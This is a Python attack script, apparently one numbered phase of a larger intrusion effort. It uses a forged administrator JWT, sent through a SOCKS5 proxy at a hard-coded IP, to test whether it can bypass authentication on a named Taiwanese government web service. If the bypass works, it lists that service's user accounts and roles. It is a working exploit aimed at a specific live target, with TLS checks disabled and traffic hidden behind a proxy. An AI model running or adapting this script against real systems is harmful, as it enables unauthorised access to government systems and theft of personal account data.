#!/usr/bin/env python3
"""Phase 69b: Verify JWT bypass on EPCR via proxy."""
import requests, urllib3, json
urllib3.disable_warnings()

# SOCKS proxy configuration
PROXY = {
    "http": "socks5://202.160.76.154:11085",
    "https": "socks5://202.160.76.154:11085"
}

# Load forged JWT token
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/jwt_admin_full.txt', 'r') as f:
    token = f.read().strip()

# Extract first/last 20 chars for display
print(f"JWT (first 20): ...{token[:20]}")
print(f"JWT (last 20): ...{token[-20:]}")
print(f"JWT length: {len(token)}")

BASE = "https://epcr.tpf.gov.tw:4004"

# Test 1: Check if server is reachable
print("\n=== Test 1: Server reachability ===")
try:
    r = requests.get(f"{BASE}/templates/login.html", proxies=PROXY, verify=False, timeout=60,
        headers={"User-Agent": "Mozilla/5.0"})
    print(f"Templates: {r.status_code}, len={len(r.text)}")
except Exception as e:
    print(f"Error: {e}")

# Test 2: GET /Users without auth
print("\n=== Test 2: GET /Users without auth ===")
try:
    r = requests.get(f"{BASE}/Users", proxies=PROXY, verify=False, timeout=60,
        headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
    print(f"Status: {r.status_code}, len={len(r.text)}")
    if r.status_code != 200:
        print(f"Body: {r.text[:200]}")
except Exception as e:
    print(f"Error: {e}")

# Test 3: GET /Users with forged JWT (Bearer)
print("\n=== Test 3: GET /Users with forged JWT (Bearer) ===")
try:
    r = requests.get(f"{BASE}/Users", proxies=PROXY, verify=False, timeout=60,
        headers={"Authorization": f"Bearer ***", "User-Agent": "Mozilla/5.0", "Accept": "application/json"})
    print(f"Status: {r.status_code}, len={len(r.text)}")
    if r.status_code == 200:
        print("AUTH BYPASS CONFIRMED!")
        users = json.loads(r.text)
        print(f"Total users: {len(users)}")
        if users:
            print(f"First user: {users[0].get('account', 'N/A')} (role: {users[0].get('Role', {}).get('name', 'N/A')})")
    else:
        print(f"Body: {r.text[:300]}")
except Exception as e:
    print(f"Error: {e}")

# Test 4: GET /Users with forged JWT (URL token)
print("\n=== Test 4: GET /Users?token=<forged_jwt> ===")
try:
    r = requests.get(f"{BASE}/Users?token={token}", proxies=PROXY, verify=False, timeout=60,
        headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json"})
    print(f"Status: {r.status_code}, len={len(r.text)}")
    if r.status_code == 200:
        print("AUTH BYPASS CONFIRMED!")
        users = json.loads(r.text)
        print(f"Total users: {len(users)}")
    else:
        print(f"Body: {r.text[:300]}")
except Exception as e:
    print(f"Error: {e}")
